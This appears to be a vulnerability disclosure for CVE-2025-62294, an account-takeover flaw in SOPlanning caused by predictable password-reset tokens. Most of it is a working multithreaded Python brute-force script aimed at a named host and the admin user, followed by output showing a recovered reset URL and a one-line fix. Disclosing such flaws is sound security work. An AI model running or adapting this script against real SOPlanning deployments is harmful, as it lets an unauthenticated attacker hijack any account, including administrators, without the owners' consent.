# (CVE-2025-62294) Predictable Generation of Password Recovery Token
## Description
> Account Takeover (ATO) vulnerability in SOPlanning <1.54, due to predictable generation of change password hash tokens. An unauthenticated user could brute-force the reset password hash token and takeover any account in the SoPlanning app via change password endpoint.
## ğŸ“ˆ CVSS Score
- **Base Score:** 8.7 (High)
- **Vector String:** CVSS:3.1AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H

## ğŸ§ª Proof of Concept (PoC)
The forgot password functionality created predictable hash token which consists of (change_password.php) :
```
$_GET['hash'] != md5($_GET['user_id'] . 'ï¿½' . $_GET['date'] . 'ï¿½' . $userTmp->cle))
```
the cle is the value generated as follow:
```
cle = MD5(RAND())
```
the RAND() functionality return number from 0 to 2147483647. It can take a while to brute-force it depending how lucky the attacker will be.

Table of time necessary to brute-force the hash and takeover the account.

| Digits (n) or Value | Attempts      | 50 Threads | 100 Threads | 200 Threads |
| ------------------- | ------------- | ---------- | ----------- | ----------- |
| 4 digits            | 10,000        | 44 s       | 22 s        | 11 s        |
| 5 digits            | 100,000       | 7.3 min    | 3.7 min     | 1.8 min     |
| 6 digits            | 1,000,000     | 1.22 hrs   | 37 min      | 18.3 min    |
| 7 digits            | 10,000,000    | 12.2 hrs   | 6.1 hrs     | 3.05 hrs    |
| 8 digits            | 100,000,000   | 5.1 days   | 2.5 days    | 1.27 days   |
| 9 digits            | 1,000,000,000 | 50.9 days  | 25.5 days   | 12.7 days   |
| max RAND()          | 2,147,483,647 | 109.3 days | 54.7 days   | 27.3 days   |
Into the calculation the average request response was generated in 0,22s


The Delimiter : ï¿½ is hex A4 - Â¤.

Python Script PoC (Admin account which cle hash value = 2333):
```
import hashlib
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

user_id = "ADM" # Change to user_id which want to takeover
date = "2025-07-23" # todays date
delimiter = "Â¤"
base_url = "https://lukasz.soplanning.pro/change_password" # Change to appropriate host
max_val = 2147483647
threads = 100
batch_size = 10000  # Number of tasks submitted per batch

found = threading.Event()
found_result = None
lock = threading.Lock()

def check_number(number):
    global found_result
    if found.is_set():
        return None

    try:
        cle = hashlib.md5(str(number).encode("latin1")).hexdigest()
        full_string = f"{user_id}{delimiter}{date}{delimiter}{cle}"
        hash_val = hashlib.md5(full_string.encode("latin1")).hexdigest()

        print(f"ğŸ” Checking {number} | cle: {cle} | hash: {hash_val}")

        params = {
            "user_id": user_id,
            "date": date,
            "hash": hash_val
        }

        response = requests.get(base_url, params=params, allow_redirects=False, timeout=10)

        if response.status_code == 200:
            with lock:
                if not found.is_set():
                    found.set()
                    found_result = {
                        "number": number,
                        "cle": cle,
                        "hash": hash_val,
                        "url": response.url
                    }
    except Exception as e:
        print(f"âŒ Error with {number}: {e}")

def run_concurrent_brute_force():
    global found_result
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for start in range(0, max_val + 1, batch_size):
            if found.is_set():
                break
            end = min(start + batch_size, max_val + 1)
            futures = {executor.submit(check_number, i): i for i in range(start, end)}

            try:
                for future in as_completed(futures):
                    if found.is_set():
                        break
            except KeyboardInterrupt:
                print("âŒ Interrupted by user. Exiting...")
                break

    if found_result:
        print("\nâœ… SUCCESS!")
        print(f"Number: {found_result['number']}")
        print(f"CLE: {found_result['cle']}")
        print(f"Hash: {found_result['hash']}")
        print(f"URL: {found_result['url']}")
    else:
        print("âŒ No valid hash found.")

if __name__ == "__main__":
    run_concurrent_brute_force()

```
Result of the script:
```
python3 PoC.py
[...]
ğŸ” Checking 2333 | cle: f7e0b956540676a129760a3eae309294 | hash: 7dc6990803a5336a8e2f6dd6d03fc7e6
ğŸ” Checking 2909 | cle: b5b03f06271f8917685d14cea7c6c50a | hash: 5e131f72cd0d39bd32cd4c5f0e0a6077
ğŸ” Checking 2925 | cle: ac34ae1fda29b8fe781ac8d6d32a6bc7 | hash: 267a76ae5331f50069c2052b52b3293c
ğŸ” Checking 2875 | cle: 4f1f29888cabf5d45f866fe457737a23 | hash: ca01642508bc6760d60a0c3f9a4cb7b3
ğŸ” Checking 2893 | cle: 9719a00ed0c5709d80dfef33795dcef3 | hash: 262a19f684fd278caeccf92cb9d778d9

âœ… SUCCESS!
Number: 2333
CLE: f7e0b956540676a129760a3eae309294
Hash: 7dc6990803a5336a8e2f6dd6d03fc7e6
URL: https://lukasz.soplanning.pro/change_password?user_id=ADM&date=2025-07-23&hash=7dc6990803a5336a8e2f6dd6d03fc7e6
```

Then just visit the URL with valid hash and change the admin password.

## ğŸ› ï¸ Recommendation / Fix

Generate a random tokens for password change in forgot password functionality.
